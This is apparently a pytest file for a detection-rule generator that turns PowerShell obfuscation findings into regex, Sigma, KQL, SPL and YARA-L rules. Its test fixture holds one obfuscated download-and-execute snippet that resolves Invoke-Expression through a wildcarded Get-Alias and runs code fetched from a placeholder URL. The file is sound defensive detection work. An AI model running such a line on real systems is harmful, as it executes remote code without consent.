"""Tests for globwarden.engine.generate.generate_rules and its validators."""

from __future__ import annotations

import json

import pytest

from globwarden.engine.generate import GenerationError, generate_rules
from globwarden.models import ObfuscationCategory, ObfuscationFinding, RuleType

from .conftest import (
    VALID_KQL_QUERY,
    VALID_REGEX_PATTERN,
    VALID_SIGMA_RULE,
    VALID_SPL_QUERY,
    VALID_YARA_L_RULE,
    kql_response_json,
    regex_response_json,
    sigma_response_json,
    spl_response_json,
    yara_l_response_json,
)


def _finding(finding_id: str = "f1") -> ObfuscationFinding:
    return ObfuscationFinding(
        id=finding_id,
        category=ObfuscationCategory.WILDCARD_RESOLUTION,
        technique_name="Wildcard Get-Alias resolution of Invoke-Expression",
        description="Resolves iex via a wildcarded Get-Alias call, then invokes it.",
        example_snippet="&(Get-Alias i*x) (irm https://example.com/a)",
        confidence=0.9,
        attack_mapping="T1027.010 (parent: T1027)",
    )


class TestRegexValidation:
    def test_valid_pattern_compiles_and_is_marked_valid(self, mock_provider_factory):
        provider = mock_provider_factory(responses=[regex_response_json(VALID_REGEX_PATTERN)])
        rules = generate_rules([_finding()], [RuleType.REGEX], provider)

        assert len(rules) == 1
        rule = rules[0]
        assert rule.rule_type == RuleType.REGEX
        assert rule.valid is True
        assert rule.validation_note is None
        import re

        re.compile(rule.content)  # must not raise

    def test_broken_pattern_retried_then_fixed(self, mock_provider_factory):
        broken = r"(?i)&\s*\(unclosed[grp"  # genuinely invalid: unterminated character set
        fixed = VALID_REGEX_PATTERN
        provider = mock_provider_factory(responses=[regex_response_json(broken), regex_response_json(fixed)])

        rules = generate_rules([_finding()], [RuleType.REGEX], provider)

        assert provider.call_count == 2  # one retry happened
        assert rules[0].valid is True
        assert rules[0].content == fixed

    def test_broken_pattern_still_broken_after_retry_is_flagged_invalid(self, mock_provider_factory):
        broken = r"(?i)&\s*\(unclosed[grp"
        provider = mock_provider_factory(responses=[regex_response_json(broken), regex_response_json(broken)])

        rules = generate_rules([_finding()], [RuleType.REGEX], provider)

        assert provider.call_count == 2
        rule = rules[0]
        assert rule.valid is False
        assert rule.validation_note is not None
        assert "compile" in rule.validation_note.lower() or "re module" in rule.validation_note.lower()
        # Never silently dropped — the broken content is still returned.
        assert rule.content == broken

    def test_missing_pattern_key_flagged_invalid_not_silently_valid(self, mock_provider_factory):
        # Regression test: a well-formed JSON object simply missing the
        # "pattern" key used to default to content='' via parsed.get(...), and
        # re.compile('') succeeds (empty string is valid Python regex) -- so
        # this silently produced valid=True for a functionally useless rule.
        response = json.dumps({"explanation": "couldn't determine a pattern"})
        provider = mock_provider_factory(responses=[response])

        rules = generate_rules([_finding()], [RuleType.REGEX], provider)

        rule = rules[0]
        assert rule.valid is False
        assert rule.validation_note is not None
        assert "empty" in rule.validation_note.lower()

    def test_empty_string_pattern_flagged_invalid(self, mock_provider_factory):
        provider = mock_provider_factory(responses=[regex_response_json("")])
        rules = generate_rules([_finding()], [RuleType.REGEX], provider)

        rule = rules[0]
        assert rule.valid is False
        assert "empty" in rule.validation_note.lower()


class TestSigmaValidation:
    def test_valid_sigma_parses_and_is_marked_valid(self, mock_provider_factory):
        provider = mock_provider_factory(responses=[sigma_response_json(VALID_SIGMA_RULE)])
        rules = generate_rules([_finding()], [RuleType.SIGMA], provider)

        rule = rules[0]
        assert rule.valid is True
        assert rule.validation_note is None
        import yaml

        parsed = yaml.safe_load(rule.content)
        assert "title" in parsed and "logsource" in parsed and "detection" in parsed
        assert "condition" in parsed["detection"]

    def test_sigma_missing_required_field_is_flagged(self, mock_provider_factory):
        broken_rule = """\
title: Some rule with no logsource or detection
id: 22222222-2222-4222-8222-222222222222
status: experimental
description: This rule is missing required Sigma structure.
level: high
"""
        provider = mock_provider_factory(responses=[sigma_response_json(broken_rule)])
        rules = generate_rules([_finding()], [RuleType.SIGMA], provider)

        rule = rules[0]
        assert rule.valid is False
        assert rule.validation_note is not None
        assert "logsource" in rule.validation_note or "detection" in rule.validation_note

    def test_sigma_broken_yaml_is_flagged_not_crashed(self, mock_provider_factory):
        broken_yaml = "title: Broken\n  bad indent: [unclosed\nlist: - x\n  - y\n:::not yaml"
        provider = mock_provider_factory(responses=[sigma_response_json(broken_yaml)])
        rules = generate_rules([_finding()], [RuleType.SIGMA], provider)

        rule = rules[0]
        assert rule.valid is False
        assert rule.validation_note is not None

    def test_sigma_missing_condition_key_is_flagged(self, mock_provider_factory):
        rule_no_condition = """\
title: Missing condition key
id: 33333333-3333-4333-8333-333333333333
status: experimental
description: detection block present but no condition key inside it.
logsource:
  category: ps_script
  product: windows
detection:
  selection:
    ScriptBlockText|contains: 'foo'
level: high
"""
        provider = mock_provider_factory(responses=[sigma_response_json(rule_no_condition)])
        rules = generate_rules([_finding()], [RuleType.SIGMA], provider)

        assert rules[0].valid is False
        assert "condition" in rules[0].validation_note


class TestBasicSanityValidation:
    def test_valid_kql_passes(self, mock_provider_factory):
        provider = mock_provider_factory(responses=[kql_response_json(VALID_KQL_QUERY)])
        rules = generate_rules([_finding()], [RuleType.KQL], provider)
        assert rules[0].valid is True

    def test_valid_spl_passes(self, mock_provider_factory):
        provider = mock_provider_factory(responses=[spl_response_json(VALID_SPL_QUERY)])
        rules = generate_rules([_finding()], [RuleType.SPL], provider)
        assert rules[0].valid is True

    def test_valid_yara_l_passes(self, mock_provider_factory):
        provider = mock_provider_factory(responses=[yara_l_response_json(VALID_YARA_L_RULE)])
        rules = generate_rules([_finding()], [RuleType.YARA_L], provider)
        assert rules[0].valid is True

    def test_empty_content_flagged_invalid(self, mock_provider_factory):
        provider = mock_provider_factory(responses=[kql_response_json("   ")])
        rules = generate_rules([_finding()], [RuleType.KQL], provider)
        assert rules[0].valid is False
        assert "empty" in rules[0].validation_note.lower()

    def test_unbalanced_parens_flagged_invalid(self, mock_provider_factory):
        broken = 'DeviceProcessEvents | where ProcessCommandLine has_any ("Get-Alias", "gal"'
        provider = mock_provider_factory(responses=[kql_response_json(broken)])
        rules = generate_rules([_finding()], [RuleType.KQL], provider)
        assert rules[0].valid is False
        assert "unbalanced" in rules[0].validation_note.lower()

    def test_unbalanced_braces_flagged_invalid_for_yara_l(self, mock_provider_factory):
        broken = 'rule broken_rule { meta: description = "x" events: $e.foo = "bar" condition: $e'
        provider = mock_provider_factory(responses=[yara_l_response_json(broken)])
        rules = generate_rules([_finding()], [RuleType.YARA_L], provider)
        assert rules[0].valid is False

    def test_yara_l_missing_rule_keyword_flagged(self, mock_provider_factory):
        not_a_rule = '{ "description": "this is json, not a yara-l rule" }'
        provider = mock_provider_factory(responses=[yara_l_response_json(not_a_rule)])
        rules = generate_rules([_finding()], [RuleType.YARA_L], provider)
        assert rules[0].valid is False


class TestGenerationErrorHandling:
    def test_garbage_response_raises_generation_error(self, mock_provider_factory):
        provider = mock_provider_factory(responses=["not json at all, sorry"])
        with pytest.raises(GenerationError):
            generate_rules([_finding()], [RuleType.KQL], provider)


class TestMalformedShapeCrashRegression:
    """Regression coverage for a previously-reported crash: `generate_rules()`
    must raise `GenerationError` (never an unhandled `AttributeError`) when the
    LLM returns text that IS valid JSON but ISN'T a top-level object — a bare
    array or JSON `null`. `json.loads()` accepts both of those as valid
    top-level JSON, so `extract_json_object()` happily returns a `list`/`None`
    and every per-rule-type handler's `parsed.get(...)` call used to blow up
    with a raw `AttributeError` instead of the module's documented
    `GenerationError`. This mirrors the equivalent `isinstance(parsed, dict)`
    check `detect.py`'s `_detect_in_chunk` already had (see
    `TestMalformedResponseHandling::test_raises_on_wrong_top_level_shape` in
    `test_detect.py`) — `generate.py` was missing the same guard.
    """

    @pytest.mark.parametrize(
        "rule_type",
        [RuleType.REGEX, RuleType.KQL, RuleType.SPL, RuleType.YARA_L, RuleType.SIGMA],
    )
    @pytest.mark.parametrize("bad_response", ["[1, 2, 3]", "null"], ids=["top-level-array", "top-level-null"])
    def test_non_dict_top_level_json_raises_generation_error_not_attribute_error(
        self, mock_provider_factory, rule_type, bad_response
    ):
        provider = mock_provider_factory(responses=[bad_response])

        # pytest.raises(GenerationError) fails the test outright if an
        # AttributeError (or anything else) escapes instead — that's the
        # regression this test guards against for every rule type.
        with pytest.raises(GenerationError) as exc_info:
            generate_rules([_finding()], [rule_type], provider)

        assert "not a JSON object" in str(exc_info.value)
        assert rule_type.value in str(exc_info.value)


class TestMultipleFindingsAndRuleTypes:
    def test_cross_product_of_findings_and_rule_types(self, mock_provider_factory):
        responses = [
            regex_response_json(VALID_REGEX_PATTERN),
            sigma_response_json(VALID_SIGMA_RULE),
            regex_response_json(VALID_REGEX_PATTERN),
            sigma_response_json(VALID_SIGMA_RULE),
        ]
        provider = mock_provider_factory(responses=responses)
        findings = [_finding("f1"), _finding("f2")]

        rules = generate_rules(findings, [RuleType.REGEX, RuleType.SIGMA], provider)

        assert len(rules) == 4
        assert [(r.finding_id, r.rule_type) for r in rules] == [
            ("f1", RuleType.REGEX),
            ("f1", RuleType.SIGMA),
            ("f2", RuleType.REGEX),
            ("f2", RuleType.SIGMA),
        ]
        assert all(r.valid for r in rules)
